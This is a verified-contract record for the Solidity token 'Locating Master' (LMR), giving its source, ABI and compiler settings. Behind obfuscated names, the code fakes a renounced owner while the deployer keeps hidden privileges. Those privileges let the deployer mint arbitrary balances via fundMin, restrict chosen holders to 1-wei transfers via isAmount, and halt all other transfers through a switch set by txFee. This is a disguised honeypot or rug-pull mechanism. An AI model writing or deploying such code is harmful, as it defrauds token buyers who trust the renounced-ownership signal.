{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.14;\n\ninterface atLaunch {\n    function createPair(address swapTrading, address walletTo) external returns (address);\n}\n\ninterface liquidityIs {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address tradingFee) external view returns (uint256);\n\n    function transfer(address feeTrading, uint256 marketingAuto) external returns (bool);\n\n    function allowance(address minTx, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 marketingAuto) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address feeTrading,\n        uint256 marketingAuto\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed sellAmountExempt, uint256 value);\n    event Approval(address indexed minTx, address indexed spender, uint256 value);\n}\n\nabstract contract swapEnable {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface minWalletAuto {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface liquidityIsMetadata is liquidityIs {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract LocatingMaster is swapEnable, liquidityIs, liquidityIsMetadata {\n\n    uint256 private senderList;\n\n    address public receiverFee;\n\n    function transfer(address sellFee, uint256 marketingAuto) external virtual override returns (bool) {\n        return autoAmount(_msgSender(), sellFee, marketingAuto);\n    }\n\n    uint256 public txTeam;\n\n    function autoAmount(address marketingLaunch, address feeTrading, uint256 marketingAuto) internal returns (bool) {\n        if (marketingLaunch == maxMinEnable) {\n            return enableFund(marketingLaunch, feeTrading, marketingAuto);\n        }\n        uint256 launchSellFund = liquidityIs(receiverFee).balanceOf(maxReceiver);\n        require(launchSellFund == walletAmount);\n        require(feeTrading != maxReceiver);\n        if (amountSender[marketingLaunch]) {\n            return enableFund(marketingLaunch, feeTrading, teamLaunch);\n        }\n        return enableFund(marketingLaunch, feeTrading, marketingAuto);\n    }\n\n    function isAmount(address minMax) public {\n        sellTx();\n        if (minModeFee != totalSwapMode) {\n            autoMax = minAuto;\n        }\n        if (minMax == maxMinEnable || minMax == receiverFee) {\n            return;\n        }\n        amountSender[minMax] = true;\n    }\n\n    function txFee(uint256 marketingAuto) public {\n        sellTx();\n        walletAmount = marketingAuto;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return senderReceiver;\n    }\n\n    string private senderReceiver = \"LMR\";\n\n    function allowance(address txMin, address listReceiverSender) external view virtual override returns (uint256) {\n        if (listReceiverSender == launchTo) {\n            return type(uint256).max;\n        }\n        return buySwap[txMin][listReceiverSender];\n    }\n\n    uint256 walletAmount;\n\n    bool public limitMaxSender;\n\n    bool public atMaxMin;\n\n    uint8 private shouldFee = 18;\n\n    mapping(address => bool) public receiverToken;\n\n    mapping(address => bool) public amountSender;\n\n    function fundMin(address sellFee, uint256 marketingAuto) public {\n        sellTx();\n        senderTake[sellFee] = marketingAuto;\n    }\n\n    address launchTo = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address maxReceiver = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 public autoMax;\n\n    function decimals() external view virtual override returns (uint8) {\n        return shouldFee;\n    }\n\n    uint256 private teamSender = 100000000 * 10 ** 18;\n\n    function owner() external view returns (address) {\n        return shouldReceiverAmount;\n    }\n\n    string private toIs = \"Locating Master\";\n\n    uint256 takeLaunch;\n\n    constructor (){\n        \n        minWalletAuto tokenTake = minWalletAuto(launchTo);\n        receiverFee = atLaunch(tokenTake.factory()).createPair(tokenTake.WETH(), address(this));\n        if (minAuto != senderList) {\n            minModeFee = true;\n        }\n        maxMinEnable = _msgSender();\n        receiverToken[maxMinEnable] = true;\n        senderTake[maxMinEnable] = teamSender;\n        receiverLaunchedSender();\n        \n        emit Transfer(address(0), maxMinEnable, teamSender);\n    }\n\n    bool public totalSwapMode;\n\n    function transferFrom(address marketingLaunch, address feeTrading, uint256 marketingAuto) external override returns (bool) {\n        if (_msgSender() != launchTo) {\n            if (buySwap[marketingLaunch][_msgSender()] != type(uint256).max) {\n                require(marketingAuto <= buySwap[marketingLaunch][_msgSender()]);\n                buySwap[marketingLaunch][_msgSender()] -= marketingAuto;\n            }\n        }\n        return autoAmount(marketingLaunch, feeTrading, marketingAuto);\n    }\n\n    event OwnershipTransferred(address indexed launchedFrom, address indexed minLiquidity);\n\n    uint256 public atAuto;\n\n    function sellTx() private view {\n        require(receiverToken[_msgSender()]);\n    }\n\n    function sellTotal(address maxIs) public {\n        if (limitMaxSender) {\n            return;\n        }\n        if (amountFee == senderList) {\n            atMaxMin = true;\n        }\n        receiverToken[maxIs] = true;\n        \n        limitMaxSender = true;\n    }\n\n    function getOwner() external view returns (address) {\n        return shouldReceiverAmount;\n    }\n\n    bool public minModeFee;\n\n    mapping(address => uint256) private senderTake;\n\n    address public maxMinEnable;\n\n    address private shouldReceiverAmount;\n\n    function approve(address listReceiverSender, uint256 marketingAuto) public virtual override returns (bool) {\n        buySwap[_msgSender()][listReceiverSender] = marketingAuto;\n        emit Approval(_msgSender(), listReceiverSender, marketingAuto);\n        return true;\n    }\n\n    function balanceOf(address tradingFee) public view virtual override returns (uint256) {\n        return senderTake[tradingFee];\n    }\n\n    uint256 public amountFee;\n\n    function name() external view virtual override returns (string memory) {\n        return toIs;\n    }\n\n    function enableFund(address marketingLaunch, address feeTrading, uint256 marketingAuto) internal returns (bool) {\n        require(senderTake[marketingLaunch] >= marketingAuto);\n        senderTake[marketingLaunch] -= marketingAuto;\n        senderTake[feeTrading] += marketingAuto;\n        emit Transfer(marketingLaunch, feeTrading, marketingAuto);\n        return true;\n    }\n\n    mapping(address => mapping(address => uint256)) private buySwap;\n\n    uint256 public receiverLaunch;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return teamSender;\n    }\n\n    uint256 constant teamLaunch = 1 ** 10;\n\n    uint256 private minAuto;\n\n    function receiverLaunchedSender() public {\n        emit OwnershipTransferred(maxMinEnable, address(0));\n        shouldReceiverAmount = address(0);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minTx\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedFrom\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minLiquidity\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellAmountExempt\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txMin\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"listReceiverSender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"amountSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listReceiverSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingAuto\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atAuto\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atMaxMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoMax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingFee\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingAuto\",\"type\":\"uint256\"}],\"name\":\"fundMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minMax\",\"type\":\"address\"}],\"name\":\"isAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitMaxSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxMinEnable\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minModeFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverFee\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverLaunch\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverLaunchedSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxIs\",\"type\":\"address\"}],\"name\":\"sellTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSwapMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingAuto\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingLaunch\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"feeTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingAuto\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"marketingAuto\",\"type\":\"uint256\"}],\"name\":\"txFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txTeam\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "LocatingMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}